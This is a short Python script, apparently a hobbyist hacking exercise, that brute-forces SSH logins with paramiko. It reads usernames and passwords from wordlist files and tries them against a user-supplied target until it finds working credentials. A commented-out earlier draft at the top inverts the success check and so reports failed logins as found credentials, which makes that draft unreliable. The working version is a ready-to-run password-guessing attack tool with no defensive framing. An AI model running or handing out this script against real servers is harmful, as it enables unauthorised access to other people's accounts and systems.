"""
import paramiko, sys, os, socket, termcolor

def ssh_connect(username, password, host, port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=port, username=username, password=password)
        ssh.close()
        return 0  

    except paramiko.AuthenticationException:
        return 1  

    except socket.error:
        return 2  

def main():
    host = input('[+] Target Address: ')
    usernames_file = "usernames.txt"
    passwords_file = "passwords.txt"

    print('\n')

    if not os.path.exists(usernames_file) or not os.path.exists(passwords_file):
        print('[!!] One or both files do not exist.')
        sys.exit(1)
        
    user_found = False

    with open(usernames_file, 'r') as users:
        for username in users:
            username = username.strip()
            print(f"[+] Trying username: {username}")
            if ssh_connect(username, "", host):
                print(termcolor.colored(f'[+] Found User: {username}', 'green'))
                user_found = True
                break

    if not user_found:
        print("[-] No valid user found")
        sys.exit(1)

    print("[+] Now trying passwords...")

    with open(passwords_file, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            if ssh_connect(username, password, host):
                print(termcolor.colored(f'[+] Found Password: {password}', 'green'))
                sys.exit(0)

    print("[-] No valid password found")

if __name__ == "__main__":
    main()
"""

import paramiko
import sys
import os
import socket
import termcolor

def ssh_connect(username, password, host, port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=port, username=username, password=password)
        ssh.close()
        return 0  # Conexión exitosa

    except paramiko.AuthenticationException:
        return 1  # Credenciales incorrectas

    except socket.error:
        return 2  # No se pudo conectar

def main():
    host = input('[+] Target Address: ')
    usernames_file = "usernames.txt"
    passwords_file = "passwords.txt"

    print('\n')

    if not os.path.exists(usernames_file) or not os.path.exists(passwords_file):
        print('[!!] One or both files do not exist.')
        sys.exit(1)

    with open(usernames_file, 'r') as users:
        for username in users:
            username = username.strip()
            with open(passwords_file, 'r') as passwords:
                for password in passwords:
                    password = password.strip()
                    response = ssh_connect(username, password, host)
                    if response == 0:
                        print(termcolor.colored(f'[+] Found Credentials: {username} / {password}', 'green'))
                        sys.exit(0)
                    elif response == 1:
                        print(f'[-] Incorrect Credentials: {username} / {password}')
                    elif response == 2:
                        print('[!!] Could not connect to the target.')
                        sys.exit(1)

if __name__ == "__main__":
    main()
